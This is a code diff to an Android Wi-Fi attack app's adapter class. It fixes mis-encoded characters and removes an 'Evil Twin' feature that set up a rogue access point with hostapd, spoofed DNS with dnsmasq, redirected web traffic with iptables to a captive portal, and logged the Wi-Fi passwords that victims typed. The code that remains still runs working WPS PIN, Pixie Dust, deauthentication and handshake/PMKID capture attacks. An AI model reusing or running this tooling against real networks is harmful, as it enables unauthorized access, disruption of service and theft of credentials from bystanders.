@@ -83,7 +83,6 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
     public volatile AdvancedThread handshake = null;
     public volatile AdvancedThread brutepsk = null;
     public volatile AdvancedProcess airodump = null;
-    public volatile AdvancedProcess evilTwinProcess = null;
     public Timer aireplay;
     public String pinconnect;
     public String wordlistpath;
@@ -243,7 +242,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         if (prevName != null && !prevName.isEmpty() && !prevName.equalsIgnoreCase(wifi.getSsid())) {
             wifi.setNameChanged(true);
             wifi.setPreviousSsid(prevName);
-            adapter.wifi_name.setText(wifi.getSsid() + " âš ï¸ (Was: " + prevName + ")");
+            adapter.wifi_name.setText(wifi.getSsid() + " ⚠️ (Was: " + prevName + ")");
         } else {
             adapter.wifi_name.setText(wifi.getSsid());
         }
@@ -389,7 +388,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
 
         if (network.isNameChanged()) {
-            name.setText(network.getSsid() + " [âš ï¸ Previous: " + network.getPreviousSsid() + "]");
+            name.setText(network.getSsid() + " [⚠️ Previous: " + network.getPreviousSsid() + "]");
         } else {
             name.setText(network.getSsid());
         }
@@ -464,7 +463,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             attackDialog(network, 7);
         });
 
-        // WPS Connect â€“ manual PIN entry (directly launches attack with entered PIN, no second dialog)
+        // WPS Connect – manual PIN entry (directly launches attack with entered PIN, no second dialog)
         if (wps_manual_connect != null) {
             wps_manual_connect.setOnClickListener(view -> {
                 android.widget.EditText pinInput = new android.widget.EditText(context);
@@ -472,7 +471,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 pinInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
                 pinInput.setMaxLines(1);
                 new MaterialAlertDialogBuilder(context)
-                        .setTitle("WPS Connect â€“ Enter PIN")
+                        .setTitle("WPS Connect – Enter PIN")
                         .setMessage("Enter the router's WPS PIN to retrieve the password.")
                         .setView(pinInput)
                         .setPositiveButton("Connect", (d2, w) -> {
@@ -488,7 +487,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             });
         }
 
-        // WPS Push Button (PBC) â€“ auto scan
+        // WPS Push Button (PBC) – auto scan
         if (wps_pbc_scan != null) {
             wps_pbc_scan.setOnClickListener(view -> {
                 new MaterialAlertDialogBuilder(context)
@@ -497,15 +496,6 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                         .setPositiveButton("Start Scan", (d2, w) -> attackDialog(network, 9))
                         .setNegativeButton(android.R.string.cancel, (d2, w) -> d2.dismiss())
                         .show();
-            });
-        }
-
-        // Evil Twin Host
-        View evil_twin_btn = dialog.findViewById(R.id.evil_twin);
-        if (evil_twin_btn != null) {
-            evil_twin_btn.setOnClickListener(view -> {
-                dialog.dismiss();
-                attackDialog(network, 10);
             });
         }
 
@@ -524,7 +514,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         return out;
     }
 
-    /** Directly run a WPS PIN attack with a pre-supplied PIN â€“ skips the type-5 PIN entry dialog. */
+    /** Directly run a WPS PIN attack with a pre-supplied PIN – skips the type-5 PIN entry dialog. */
     public void attackDialogWithPin(WiFINetwork network, String pin) {
         final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.WPS_PIN_ONE,
                 network.getSsid(), targetMeta(network));
@@ -561,7 +551,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                     monitor.failStage(AttackStage.WPS, "Registrar locked",
                             context.getString(R.string.wifi_wps_locked_result));
                 } else {
-                    monitor.finish(false, "PIN rejected â€“ wrong PIN or WPS disabled.");
+                    monitor.finish(false, "PIN rejected – wrong PIN or WPS disabled.");
                 }
             }
 
@@ -586,7 +576,6 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             case 7:  return AttackKind.DEAUTH_ONE;
             case 8:  return AttackKind.WPS_PIN_NULL;
             case 9:  return AttackKind.WPS_PBC;
-            case 10: return AttackKind.EVIL_TWIN;
             case 1:
             default: return AttackKind.PIXIE_DUST;
         }
@@ -614,13 +603,13 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
     private void offerConnect(AttackMonitor monitor, WiFINetwork network, String psk) {
         monitor.primary(context.getString(R.string.auto_connect), () -> {
-            monitor.primaryLabel("Connectingâ€¦");
+            monitor.primaryLabel("Connecting…");
             core.connectWiFi2(network.getSsid(), psk);
             new Thread(() -> {
                 long end = System.currentTimeMillis() + 25000;
                 while (System.currentTimeMillis() < end) {
                     if (checkIsSsidConnected(network.getSsid())) {
-                        activity.runOnUiThread(() -> monitor.primaryLabel("Connected âœ“"));
+                        activity.runOnUiThread(() -> monitor.primaryLabel("Connected ✓"));
                         return;
                     }
                     try {
@@ -653,7 +642,6 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             if (brutepin != null) {brutepin.kill();}
             if (deauther != null) {deauther.kill();}
             if (airodump != null) {airodump.kill();}
-            if (evilTwinProcess != null) {evilTwinProcess.kill();}
             try{
                 aireplay.cancel();
             }catch (Exception ignored){
@@ -713,7 +701,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                     if (line.contains("WPA PSK:")){
                         kill();
                     }
-                    if (line.contains("Associating with APâ€¦")){
+                    if (line.contains("Associating with AP…")){
                         scanCount[0]++;
                     }
                     if (scanCount[0] > 3){
@@ -852,7 +840,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                             && MonitorManager.isInternalRadio(deauthPref)){
                         if (!MonitorManager.isInternalRadio(wlanscan)) {
                             deauthPref = wlanscan;
-                            sendEvent("Deauth interface is the internal radio â€” using " + wlanscan + " instead (enable 'Deauth with internal adapter' in Settings to use it)");
+                            sendEvent("Deauth interface is the internal radio — using " + wlanscan + " instead (enable 'Deauth with internal adapter' in Settings to use it)");
                         } else {
                             deauth = false;
                         }
@@ -899,7 +887,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                         }
                         if (canceled) return;
                         if (!airoRunning[0]){
-                            sendEvent("Target never showed up on this channel â€” aborting.");
+                            sendEvent("Target never showed up on this channel — aborting.");
                             if (airodump != null) airodump.kill();
                             monitor.failStage(AttackStage.TARGET, "No beacons in 60 seconds",
                                     "Target never appeared on channel " + network.getChannel());
@@ -910,7 +898,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                             if (!deauth){
                                 sendEvent("Can`t deauth with (s)wlan0 interface! Passive mode!");
                                 monitor.stage(AttackStage.DEAUTH, AttackStage.State.FAILED,
-                                        "Internal radio cannot inject â€” waiting passively");
+                                        "Internal radio cannot inject — waiting passively");
                             }else{
                             sendEvent("Starting deauth...");}
                             final String deauthIface = core.monitorManager.isMonitorModeEnabled(wlandeauth + "mon")
@@ -958,9 +946,9 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                         hsStatus[0] = false;
                                         pmkidStatus[0] = false;
                                         sendEvent("Announced, but not there: the file holds no handshake"
-                                                + " and no PMKID â€” still listening.");
+                                                + " and no PMKID — still listening.");
                                         monitor.stage(AttackStage.EAPOL, AttackStage.State.ACTIVE,
-                                                "False alarm â€” waiting for a client to rejoin");
+                                                "False alarm — waiting for a client to rejoin");
                                         monitor.metric(AttackMetric.STATE, "Listening");
                                         airodump = startAirodump(monitor, network, capIface,
                                                 guestShare, lockedChannel[0], airoRunning, hsStatus,
@@ -975,7 +963,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                         continue;
                                     }
                                     if (airodump != null && !airodump.isRunning()){
-                                        sendEvent("airodump-ng stopped unexpectedly â€” aborting.");
+                                        sendEvent("airodump-ng stopped unexpectedly — aborting.");
                                         monitor.failStage(AttackStage.CAPTURE, "airodump-ng exited",
                                                 "airodump-ng stopped unexpectedly");
                                         break;
@@ -987,7 +975,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                         relocks++;
                                         lockedChannel[0] = to;
                                         monitor.note("Target is on channel " + to
-                                                + " â€” restarting the capture there");
+                                                + " — restarting the capture there");
                                         monitor.metric(AttackMetric.CHANNEL, to);
                                         if (deauther != null) {
                                             deauther.kill();
@@ -1030,8 +1018,8 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                                     + DEAUTH_BEACON_GRACE_MS;
                                             monitor.stage(AttackStage.DEAUTH, AttackStage.State.ACTIVE,
                                                     targets.isEmpty()
-                                                            ? deauthIface + " Â· broadcast"
-                                                            : deauthIface + " Â· "
+                                                            ? deauthIface + " · broadcast"
+                                                            : deauthIface + " · "
                                                                     + Math.min(targets.size(),
                                                                             DEAUTH_MAX_CLIENTS)
                                                                     + " client(s)");
@@ -1053,7 +1041,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                             if (verdict == null) {
                                 hsStatus[0] = false;
                                 pmkidStatus[0] = false;
-                                sendEvent("Nothing was captured â€” no handshake and no PMKID.");
+                                sendEvent("Nothing was captured — no handshake and no PMKID.");
                                 monitor.failStage(AttackStage.EAPOL,
                                         "No handshake and no PMKID",
                                         "The capture ended before a client rejoined, so there is"
@@ -1084,8 +1072,8 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                             ? (isHandshake ? "Handshake" : "PMKID")
                                                     + " confirmed by " + verdict.source
                                             : verdict.unreachable == null
-                                                    ? "Saved unchecked â€” the capture could not be read back"
-                                                    : "Saved unchecked â€” " + verdict.unreachable);
+                                                    ? "Saved unchecked — the capture could not be read back"
+                                                    : "Saved unchecked — " + verdict.unreachable);
 
                             String captureDir = core.getShareRoot() + "/captured";
                             String time = new SimpleDateFormat("MM_HH_mm", Locale.ENGLISH).format(new Date());
@@ -1095,14 +1083,14 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                     ? (isHandshake ? "Handshake" : "PMKID")
                                             + " confirmed in the capture by " + verdict.source + "."
                                     : verdict.unreachable == null
-                                            ? "Saving without checking â€” neither this app nor"
+                                            ? "Saving without checking — neither this app nor"
                                                     + " aircrack-ng could read the capture back."
-                                            : "Saving without checking â€” aircrack-ng could not"
+                                            : "Saving without checking — aircrack-ng could not"
                                                     + " open the capture: " + verdict.unreachable);
                             monitor.stage(AttackStage.SAVE, AttackStage.State.ACTIVE);
                             String saved = archiveCapture(captureDir, filename);
                             if (saved == null) {
-                                sendEvent("Capture file not found â€” nothing was saved.");
+                                sendEvent("Capture file not found — nothing was saved.");
                                 monitor.stage(AttackStage.SAVE, AttackStage.State.FAILED,
                                         "Nothing to move out of the share");
                             } else {
@@ -1223,8 +1211,8 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             };
         }
         else if (type == 9) {
-            // WPS Push Button (PBC) attack â€“ uses --pbc flag with pixie.py / reaver
-            monitor.note("WPS PBC â€“ waiting for router push-button eventâ€¦");
+            // WPS Push Button (PBC) attack – uses --pbc flag with pixie.py / reaver
+            monitor.note("WPS PBC – waiting for router push-button event…");
             monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE, "Taking the radio off Android");
             new Thread(core::wpsDisableWifiIfEnabled, "wps-radio-off").start();
             String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
@@ -1552,186 +1540,9 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 deauthAttempt(monitor, network, monIface, channel, dialogCanceled, 0);
             }).start();
         }
-        else if (type == 10) {
-            // Evil Twin Host â€“ rogue AP + captive portal credential capture
-            new Thread(() -> runEvilTwinAttack(monitor, network, dialogCanceled)).start();
-        }
     }
 
     private static final long LISTEN_FIRST_MS = 45_000L;
-
-    // ------------------------------------------------------------------ Evil Twin Host
-    private void runEvilTwinAttack(AttackMonitor monitor, WiFINetwork network,
-                                   AtomicBoolean dialogCanceled) {
-        final String ssid    = network.getSsid() != null ? network.getSsid() : "Target";
-        final int    channel = network.getChannel() > 0  ? network.getChannel() : 6;
-        final String share   = core.guestShare();
-        final String etDir   = share + "/evil_twin";
-
-        // 1. Freeing radio
-        monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE, "Preparing interface");
-        core.customChrootCommand("mkdir -p " + etDir);
-
-        // 2. Copy assets to guest share
-        try {
-            copyAssetToFile("evil_twin_portal.html", etDir + "/evil_twin_portal.html");
-            copyAssetToFile("evil_twin_server.py",   etDir + "/evil_twin_server.py");
-        } catch (java.io.IOException e) {
-            monitor.failStage(AttackStage.RADIO, "Asset copy failed", e.getMessage());
-            return;
-        }
-        // Also copy to /tmp in guest (python server expects /tmp paths)
-        core.customChrootCommand(
-            "cp -f " + etDir + "/evil_twin_portal.html /tmp/evil_twin_portal.html; " +
-            "cp -f " + etDir + "/evil_twin_server.py /tmp/evil_twin_server.py; " +
-            "chmod +x /tmp/evil_twin_server.py; " +
-            "rm -f /tmp/et_creds.txt; touch /tmp/et_creds.txt"
-        );
-        monitor.stage(AttackStage.RADIO, AttackStage.State.DONE, "Interface ready");
-        if (dialogCanceled.get()) return;
-
-        // 3. Write hostapd.conf
-        monitor.stage(AttackStage.AP_START, AttackStage.State.ACTIVE, "Building rogue AP config");
-        String wlanIfaceTemp = core.getWPSInterface();
-        if (wlanIfaceTemp == null || wlanIfaceTemp.isEmpty()) wlanIfaceTemp = "wlan0";
-        final String wlanIface = wlanIfaceTemp;
-        String hostapdConf =
-            "interface=" + wlanIface + "\n" +
-            "driver=nl80211\n" +
-            "ssid=" + ssid + "\n" +
-            "hw_mode=g\n" +
-            "channel=" + channel + "\n" +
-            "macaddr_acl=0\n" +
-            "auth_algs=1\n" +
-            "ignore_broadcast_ssid=0\n";
-        // Write via echo to guest
-        String escapedConf = hostapdConf.replace("\"", "\\\"").replace("\n", "\\n");
-        core.customChrootCommand(
-            "printf '" + hostapdConf.replace("'", "'\\''") + "' > /tmp/evil_twin_hostapd.conf"
-        );
-
-        // 4. Stop conflicting services, bring up AP
-        core.customChrootCommand(
-            "killall hostapd dnsmasq python3 2>/dev/null; sleep 1; " +
-            "ip link set " + wlanIface + " up; " +
-            "ip addr flush dev " + wlanIface + "; " +
-            "ip addr add 10.0.0.1/24 dev " + wlanIface
-        );
-        monitor.stage(AttackStage.AP_START, AttackStage.State.DONE, "Rogue AP starting on ch " + channel);
-        if (dialogCanceled.get()) return;
-
-        // 5. Start hostapd (background, suppress stdout)
-        String hostapdCmd = "hostapd /tmp/evil_twin_hostapd.conf";
-        evilTwinProcess = new AdvancedProcess(activity, context, hostapdCmd, true) {
-            @Override public void onFinished(ArrayList<String> out) {}
-            @Override public void onNewLine(String line) {
-                if (line != null && !line.trim().isEmpty()) {
-                    monitor.console(line);
-                }
-            }
-            @Override public void onEvent(String line) {}
-        };
-
-        // 6. Start DHCP + DNS spoof via dnsmasq
-        monitor.stage(AttackStage.DHCP, AttackStage.State.ACTIVE, "Starting DHCP + DNS");
-        core.customChrootCommand(
-            "dnsmasq --no-daemon --no-resolv --no-hosts " +
-            "--dhcp-range=10.0.0.2,10.0.0.20,12h " +
-            "--address=/#/10.0.0.1 " +
-            "--dhcp-option=3,10.0.0.1 " +
-            "--dhcp-option=6,10.0.0.1 " +
-            "--listen-address=10.0.0.1 " +
-            "--bind-interfaces " +
-            "-i " + wlanIface + " &"
-        );
-        // iptables: forward port 80 to 8080 for captive portal
-        core.customChrootCommand(
-            "iptables -t nat -F PREROUTING 2>/dev/null; " +
-            "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080; " +
-            "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080"
-        );
-        monitor.stage(AttackStage.DHCP, AttackStage.State.DONE, "DHCP active on 10.0.0.1");
-        if (dialogCanceled.get()) return;
-
-        // 7. Start Python captive portal server
-        monitor.stage(AttackStage.PORTAL, AttackStage.State.ACTIVE, "Captive portal on :8080");
-        String portalCmd = "python3 /tmp/evil_twin_server.py \"" + ssid.replace("\"", "") + "\"";
-        AdvancedProcess portalProc = new AdvancedProcess(activity, context, portalCmd, true) {
-            @Override public void onFinished(ArrayList<String> out) {}
-            @Override public void onNewLine(String line) {
-                if (line != null && line.startsWith("[ET-CRED]")) {
-                    // Parse: [ET-CRED] 10:30:45 AM | 10.0.0.5 | password123
-                    String[] parts = line.substring(9).split("\\|");
-                    if (parts.length >= 3) {
-                        String ts   = parts[0].trim();
-                        String ip   = parts[1].trim();
-                        String pass = parts[2].trim();
-                        int count = capturedCount.incrementAndGet();
-                        monitor.metric(AttackMetric.CRACKED, String.valueOf(count));
-                        monitor.showCrackedLog(
-                            "ðŸŽ¯ " + ts + "  |  " + ip + "\nðŸ”‘ " + pass
-                        );
-                        monitor.console("[ET-CRED] " + ip + " â†’ " + pass);
-                        // vibrate on capture
-                        try { core.vibrate(300); } catch (Exception ignored) {}
-                        core.saveNetwork(network.getMac(), pass, "", ssid);
-                    }
-                } else if (line != null && !line.isEmpty()) {
-                    monitor.console(line);
-                }
-            }
-            @Override public void onEvent(String line) {}
-        };
-
-        monitor.stage(AttackStage.PORTAL, AttackStage.State.DONE,
-                "Portal active â€” waiting for victims");
-        monitor.stage(AttackStage.CAPTURING, AttackStage.State.ACTIVE, "0 credentials captured");
-        monitor.metric(AttackMetric.STATE, "Waiting for clients");
-
-        // Poll connected client count every 5s
-        new Thread(() -> {
-            int lastCount = 0;
-            while (!dialogCanceled.get()) {
-                try {
-                    Thread.sleep(5000);
-                } catch (InterruptedException e) {
-                    break;
-                }
-                if (dialogCanceled.get()) break;
-                ArrayList<String> arpOut = core.customChrootCommand(
-                    "arp -n 2>/dev/null | grep " + wlanIface + " | wc -l"
-                );
-                if (!arpOut.isEmpty()) {
-                    try {
-                        int clients = Integer.parseInt(arpOut.get(0).trim());
-                        if (clients != lastCount) {
-                            lastCount = clients;
-                            monitor.metric(AttackMetric.CLIENTS, String.valueOf(clients));
-                            monitor.metric(AttackMetric.STATE,
-                                clients > 0 ? clients + " client(s) connected" : "Waiting for clients");
-                        }
-                    } catch (Exception ignored) {}
-                }
-            }
-        }).start();
-    }
-
-    private final java.util.concurrent.atomic.AtomicInteger capturedCount =
-            new java.util.concurrent.atomic.AtomicInteger(0);
-
-    /** Copy an asset file to an absolute path on the host filesystem. */
-    private void copyAssetToFile(String assetName, String destPath) throws java.io.IOException {
-        java.io.File dest = new java.io.File(destPath);
-        java.io.File parent = dest.getParentFile();
-        if (parent != null) parent.mkdirs();
-        try (InputStream in  = context.getAssets().open(assetName);
-             OutputStream out = new java.io.FileOutputStream(dest)) {
-            byte[] buf = new byte[4096];
-            int n;
-            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
-        }
-    }
-    // ------------------------------------------------------------------ end Evil Twin
 
     private AdvancedProcess startAirodump(AttackMonitor monitor, WiFINetwork network,
                                           String capIface, String guestShare, int channel,
@@ -1767,12 +1578,12 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                         airoRunning[0] = true;
                     }
                     if (line.contains("WPA handshake:")) {
-                        if (!hsStatus[0]) say.line("airodump-ng reports a handshake â€” checking the capture...");
+                        if (!hsStatus[0]) say.line("airodump-ng reports a handshake — checking the capture...");
                         hsStatus[0] = true;
                         return;
                     }
                     if (line.contains("PMKID")) {
-                        if (!pmkidStatus[0]) say.line("airodump-ng reports a PMKID â€” checking the capture...");
+                        if (!pmkidStatus[0]) say.line("airodump-ng reports a PMKID — checking the capture...");
                         pmkidStatus[0] = true;
                         return;
                     }
@@ -1830,7 +1641,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                     }
                     if (internalDeauth) {
                         monitor.stage(AttackStage.DEAUTH, AttackStage.State.FAILED,
-                                "Internal radio cannot inject â€” waiting passively");
+                                "Internal radio cannot inject — waiting passively");
                     }
                 }
                 if (startedAt[0] == 0L && line.contains("Sending") && line.contains("DeAuth")) {
@@ -1885,7 +1696,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 }
                 if (apChannel[0] > 0 && apChannel[0] != channel) {
                     monitor.note("Nothing was sent on channel " + channel
-                            + " â€” retuning to " + apChannel[0]);
+                            + " — retuning to " + apChannel[0]);
                     new Thread(() -> {
                         core.customChrootCommand("iw dev " + iface + " set channel " + apChannel[0]);
                         deauthAttempt(monitor, network, iface, apChannel[0], canceled, attempt + 1);
@@ -1907,7 +1718,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 if (named != null && named != apChannel[0]) {
                     apChannel[0] = named;
                     monitor.metric(AttackMetric.CHANNEL, String.valueOf(named));
-                    monitor.note("AP answers on channel " + named + " â€” retuning " + iface);
+                    monitor.note("AP answers on channel " + named + " — retuning " + iface);
                     core.threadChrootCommand("iw dev " + iface + " set channel " + named);
                 }
                 monitor.aireplay(masked(line));
@@ -1930,7 +1741,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 }
             }
             if (!sent[0] && !done[0] && !canceled.get() && deauther != null) {
-                monitor.note("No bursts in " + (DEAUTH_SILENCE_MS / 1000) + "s â€” restarting");
+                monitor.note("No bursts in " + (DEAUTH_SILENCE_MS / 1000) + "s — restarting");
                 deauther.kill();
             }
         }, "deauth-watchdog").start();
